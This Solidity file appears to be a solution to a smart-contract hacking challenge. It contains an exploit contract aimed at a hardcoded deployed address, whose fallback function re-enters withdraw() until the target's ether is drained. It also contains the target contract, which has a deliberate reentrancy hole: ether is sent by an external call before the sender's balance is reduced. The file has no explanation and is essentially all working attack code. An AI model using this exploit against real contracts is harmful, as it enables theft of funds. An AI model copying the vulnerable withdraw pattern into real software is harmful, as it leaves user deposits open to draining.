// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract ReentranceExploiter{
    Reentrance public exploitee = Reentrance(0x9A44c10a3522157E308CcA5578a21DF456B2C109);

    function withdraw(uint val) external {
        exploitee.withdraw(val);
    }

    fallback() external payable {
        uint bal = address(exploitee).balance;
        if(bal < msg.value) {
            exploitee.withdraw(bal);
        }
        else if (bal > 0) {
            exploitee.withdraw(msg.value);
        }
    }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}